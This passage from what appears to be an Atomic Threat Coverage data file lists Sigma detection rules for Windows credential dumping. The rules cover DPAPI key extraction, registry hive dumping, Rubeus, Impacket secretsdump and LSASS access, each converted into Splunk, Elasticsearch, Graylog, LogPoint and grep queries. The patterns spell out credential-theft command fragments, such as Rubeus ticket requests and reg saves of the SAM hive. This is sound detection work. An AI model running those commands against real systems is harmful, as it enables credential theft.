AccessMask:\\\\\"0x2\\\\\" AND ObjectName:\\\\\"BCKUPKEY\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4662\\\\\" AND ObjectType:\\\\\"SecretObject\\\\\" AND AccessMask:\\\\\"0x2\\\\\" AND ObjectName:\\\\\"BCKUPKEY\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1003 DPAPI Domain Backup Key Extraction\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4662\" AND ObjectType:\"SecretObject\" AND AccessMask:\"0x2\" AND ObjectName:\"BCKUPKEY\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4662\" ObjectType=\"SecretObject\" AccessMask=\"0x2\" ObjectName=\"BCKUPKEY\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4662\" ObjectType=\"SecretObject\" AccessMask=\"0x2\" ObjectName=\"BCKUPKEY\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4662)(?=.*SecretObject)(?=.*0x2)(?=.*BCKUPKEY))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1003 DPAPI Domain Master Key Backup Attempt\nid: 39a94fd1-8c9a-4ff6-bf22-c058762f8014\ndescription: Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.\nstatus: experimental\ndate: 2019/08/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/domain_dpapi_backupkey_extraction.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4692\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1003 DPAPI Domain Master Key Backup Attempt\nid: 39a94fd1-8c9a-4ff6-bf22-c058762f8014\ndescription: Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.\nstatus: experimental\ndate: 2019/08/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/domain_dpapi_backupkey_extraction.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4692\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:\"4692\"", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1003-DPAPI-Domain-Master-Key-Backup-Attempt <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1003 DPAPI Domain Master Key Backup Attempt\",\\n    \"description\": \"Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"EventID:\\\\\"4692\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"4692\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1003 DPAPI Domain Master Key Backup Attempt\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:\"4692\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "EventID=\"4692\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4692\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^4692'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Grabbing sensitive hives via reg utility\nid: fd877b94-9bb5-4191-bb25-d79cbd93c167\ndescription: Dump sam, system or security hives using REG.exe utility\nauthor: Teymur Kheirkhabarov, Endgame, JHasenbusch, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - car.2013-07-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        NewProcessName: '*\\reg.exe'\n        CommandLine|contains: \n            - 'save'\n            - 'export'\n    selection_2:\n        CommandLine|contains: \n            - 'hklm'\n            - 'hkey_local_machine'\n    selection_3:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: selection_1 and selection_2 and selection_3\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Grabbing sensitive hives via reg utility\nid: fd877b94-9bb5-4191-bb25-d79cbd93c167\ndescription: Dump sam, system or security hives using REG.exe utility\nauthor: Teymur Kheirkhabarov, Endgame, JHasenbusch, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - car.2013-07-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        NewProcessName: '*\\reg.exe'\n        CommandLine|contains: \n            - 'save'\n            - 'export'\n    selection_2:\n        CommandLine|contains: \n            - 'hklm'\n            - 'hkey_local_machine'\n    selection_3:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: selection_1 and selection_2 and selection_3\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(NewProcessName.keyword:*\\\\\\\\reg.exe AND CommandLine.keyword:(*save* OR *export*) AND CommandLine.keyword:(*hklm* OR *hkey_local_machine*) AND CommandLine.keyword:(*\\\\\\\\system OR *\\\\\\\\sam OR *\\\\\\\\security))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Grabbing-sensitive-hives-via-reg-utility <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Grabbing sensitive hives via reg utility\",\\n    \"description\": \"Dump sam, system or security hives using REG.exe utility\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"car.2013-07-001\"\\n    ],\\n    \"query\": \"(NewProcessName.keyword:*\\\\\\\\\\\\\\\\reg.exe AND CommandLine.keyword:(*save* OR *export*) AND CommandLine.keyword:(*hklm* OR *hkey_local_machine*) AND CommandLine.keyword:(*\\\\\\\\\\\\\\\\system OR *\\\\\\\\\\\\\\\\sam OR *\\\\\\\\\\\\\\\\security))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(NewProcessName.keyword:*\\\\\\\\\\\\\\\\reg.exe AND CommandLine.keyword:(*save* OR *export*) AND CommandLine.keyword:(*hklm* OR *hkey_local_machine*) AND CommandLine.keyword:(*\\\\\\\\\\\\\\\\system OR *\\\\\\\\\\\\\\\\sam OR *\\\\\\\\\\\\\\\\security))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Grabbing sensitive hives via reg utility\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(NewProcessName.keyword:*\\\\\\\\reg.exe AND CommandLine.keyword:(*save* *export*) AND CommandLine.keyword:(*hklm* *hkey_local_machine*) AND CommandLine.keyword:(*\\\\\\\\system *\\\\\\\\sam *\\\\\\\\security))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(NewProcessName=\"*\\\\\\\\reg.exe\" (CommandLine=\"*save*\" OR CommandLine=\"*export*\") (CommandLine=\"*hklm*\" OR CommandLine=\"*hkey_local_machine*\") (CommandLine=\"*\\\\\\\\system\" OR CommandLine=\"*\\\\\\\\sam\" OR CommandLine=\"*\\\\\\\\security\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" NewProcessName=\"*\\\\\\\\reg.exe\" CommandLine IN [\"*save*\", \"*export*\"] CommandLine IN [\"*hklm*\", \"*hkey_local_machine*\"] CommandLine IN [\"*\\\\\\\\system\", \"*\\\\\\\\sam\", \"*\\\\\\\\security\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\reg\\\\.exe)(?=.*(?:.*.*save.*|.*.*export.*))(?=.*(?:.*.*hklm.*|.*.*hkey_local_machine.*))(?=.*(?:.*.*\\\\system|.*.*\\\\sam|.*.*\\\\security)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Rubeus Hack Tool\nid: 7ec2c172-dceb-4c10-92c9-87c1881b7e18\ndescription: Detects command line parameters used by Rubeus hack tool\nauthor: Florian Roth\nreferences:\n    - https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/\ndate: 2018/12/19\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - attack.s0005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* asreproast *'\n            - '* dump /service:krbtgt *'\n            - '* kerberoast *'\n            - '* createnetonly /program:*'\n            - '* ptt /ticket:*'\n            - '* /impersonateuser:*'\n            - '* renew /ticket:*'\n            - '* asktgt /user:*'\n            - '* harvest /interval:*'\n    condition: selection\nfalsepositives:\n    - unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Rubeus Hack Tool\nid: 7ec2c172-dceb-4c10-92c9-87c1881b7e18\ndescription: Detects command line parameters used by Rubeus hack tool\nauthor: Florian Roth\nreferences:\n    - https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/\ndate: 2018/12/19\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - attack.s0005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* asreproast *'\n            - '* dump /service:krbtgt *'\n            - '* kerberoast *'\n            - '* createnetonly /program:*'\n            - '* ptt /ticket:*'\n            - '* /impersonateuser:*'\n            - '* renew /ticket:*'\n            - '* asktgt /user:*'\n            - '* harvest /interval:*'\n    condition: selection\nfalsepositives:\n    - unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ asreproast\\\\ * OR *\\\\ dump\\\\ \\\\/service\\\\:krbtgt\\\\ * OR *\\\\ kerberoast\\\\ * OR *\\\\ createnetonly\\\\ \\\\/program\\\\:* OR *\\\\ ptt\\\\ \\\\/ticket\\\\:* OR *\\\\ \\\\/impersonateuser\\\\:* OR *\\\\ renew\\\\ \\\\/ticket\\\\:* OR *\\\\ asktgt\\\\ \\\\/user\\\\:* OR *\\\\ harvest\\\\ \\\\/interval\\\\:*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Rubeus-Hack-Tool <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Rubeus Hack Tool\",\\n    \"description\": \"Detects command line parameters used by Rubeus hack tool\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ asreproast\\\\\\\\ * OR *\\\\\\\\ dump\\\\\\\\ \\\\\\\\/service\\\\\\\\:krbtgt\\\\\\\\ * OR *\\\\\\\\ kerberoast\\\\\\\\ * OR *\\\\\\\\ createnetonly\\\\\\\\ \\\\\\\\/program\\\\\\\\:* OR *\\\\\\\\ ptt\\\\\\\\ \\\\\\\\/ticket\\\\\\\\:* OR *\\\\\\\\ \\\\\\\\/impersonateuser\\\\\\\\:* OR *\\\\\\\\ renew\\\\\\\\ \\\\\\\\/ticket\\\\\\\\:* OR *\\\\\\\\ asktgt\\\\\\\\ \\\\\\\\/user\\\\\\\\:* OR *\\\\\\\\ harvest\\\\\\\\ \\\\\\\\/interval\\\\\\\\:*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ asreproast\\\\\\\\ * OR *\\\\\\\\ dump\\\\\\\\ \\\\\\\\/service\\\\\\\\:krbtgt\\\\\\\\ * OR *\\\\\\\\ kerberoast\\\\\\\\ * OR *\\\\\\\\ createnetonly\\\\\\\\ \\\\\\\\/program\\\\\\\\:* OR *\\\\\\\\ ptt\\\\\\\\ \\\\\\\\/ticket\\\\\\\\:* OR *\\\\\\\\ \\\\\\\\/impersonateuser\\\\\\\\:* OR *\\\\\\\\ renew\\\\\\\\ \\\\\\\\/ticket\\\\\\\\:* OR *\\\\\\\\ asktgt\\\\\\\\ \\\\\\\\/user\\\\\\\\:* OR *\\\\\\\\ harvest\\\\\\\\ \\\\\\\\/interval\\\\\\\\:*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Rubeus Hack Tool\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* asreproast * * dump \\\\/service\\\\:krbtgt * * kerberoast * * createnetonly \\\\/program\\\\:* * ptt \\\\/ticket\\\\:* * \\\\/impersonateuser\\\\:* * renew \\\\/ticket\\\\:* * asktgt \\\\/user\\\\:* * harvest \\\\/interval\\\\:*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* asreproast *\" OR CommandLine=\"* dump /service:krbtgt *\" OR CommandLine=\"* kerberoast *\" OR CommandLine=\"* createnetonly /program:*\" OR CommandLine=\"* ptt /ticket:*\" OR CommandLine=\"* /impersonateuser:*\" OR CommandLine=\"* renew /ticket:*\" OR CommandLine=\"* asktgt /user:*\" OR CommandLine=\"* harvest /interval:*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* asreproast *\", \"* dump /service:krbtgt *\", \"* kerberoast *\", \"* createnetonly /program:*\", \"* ptt /ticket:*\", \"* /impersonateuser:*\", \"* renew /ticket:*\", \"* asktgt /user:*\", \"* harvest /interval:*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* asreproast .*|.*.* dump /service:krbtgt .*|.*.* kerberoast .*|.*.* createnetonly /program:.*|.*.* ptt /ticket:.*|.*.* /impersonateuser:.*|.*.* renew /ticket:.*|.*.* asktgt /user:.*|.*.* harvest /interval:.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Impacket SecretDump remote activity\nid: 252902e3-5830-4cf6-bf21-c22083dfd5cf\ndescription: Detect AD credential dumping using impacket secretdump HKTL\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\ADMIN$\n        RelativeTargetName: 'SYSTEM32\\\\*.tmp'\n    condition: selection\nfalsepositives: \n    - pentesting\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Impacket SecretDump remote activity\nid: 252902e3-5830-4cf6-bf21-c22083dfd5cf\ndescription: Detect AD credential dumping using impacket secretdump HKTL\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\ADMIN$\n        RelativeTargetName: 'SYSTEM32\\\\*.tmp'\n    condition: selection\nfalsepositives: \n    - pentesting\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\ADMIN$ AND RelativeTargetName.keyword:SYSTEM32\\\\\\\\*.tmp)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Impacket-SecretDump-remote-activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Impacket SecretDump remote activity\",\\n    \"description\": \"Detect AD credential dumping using impacket secretdump HKTL\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\ADMIN$ AND RelativeTargetName.keyword:SYSTEM32\\\\\\\\\\\\\\\\*.tmp)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\ADMIN$ AND RelativeTargetName.keyword:SYSTEM32\\\\\\\\\\\\\\\\*.tmp)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Impacket SecretDump remote activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\ADMIN$ AND RelativeTargetName.keyword:SYSTEM32\\\\\\\\*.tmp)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\ADMIN$\" RelativeTargetName=\"SYSTEM32\\\\\\\\*.tmp\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\ADMIN$\" RelativeTargetName=\"SYSTEM32\\\\\\\\*.tmp\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\ADMIN\\\\$)(?=.*SYSTEM32\\\\\\\\.*\\\\.tmp))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1003 LSASS Access from Non System Account\nid: 962fe167-e48d-4fd6-9974-11e5b9a5d6d1\ndescription: Detects potential mimikatz-like tools accessing LSASS from non system account\nstatus: experimental\ndate: 2019/06/20\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/lsass_access_non_system_account.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID:\n            - 4663\n            - 4656\n        ObjectType: 'Process'\n        ObjectName|endswith: '\\lsass.exe'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1003 LSASS Access from Non System Account\nid: 962fe167-e48d-4fd6-9974-11e5b9a5d6d1\ndescription: Detects potential mimikatz-like tools accessing LSASS from non system account\nstatus: experimental\ndate: 2019/06/20\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/lsass_access_non_system_account.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID:\n            - 4663\n            - 4656\n        ObjectType: 'Process'\n        ObjectName|endswith: '\\lsass.exe'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:(\"4663\" OR \"4656\") AND ObjectType:\"Process\" AND ObjectName.keyword:*\\\\\\\\lsass.exe) AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1003-LSASS-Access-from-Non-System-Account <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1003 LSASS Access from Non System Account\",\\n    \"description\": \"Detects potential mimikatz-like tools accessing LSASS from non system account\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"((EventID:(\\\\\"4663\\\\\" OR \\\\\"4656\\\\\") AND ObjectType:\\\\\"Process\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\lsass.exe) AND (NOT (SubjectUserName.keyword:*$)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:(\\\\\"4663\\\\\" OR \\\\\"4656\\\\\") AND ObjectType:\\\\\"Process\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\lsass.exe) AND (NOT (SubjectUserName.keyword:*$)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1003 LSASS Access from Non System Account\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:(\"4663\" \"4656\") AND ObjectType:\"Process\" AND ObjectName.keyword:*\\\\\\\\lsass.exe) AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"4663\" OR EventID=\"4656\") ObjectType=\"Process\" ObjectName=\"*\\\\\\\\lsass.exe\") NOT (SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id IN [\"4663\", \"4656\"] ObjectType=\"Process\" ObjectName=\"*\\\\\\\\lsass.exe\")  -(SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P 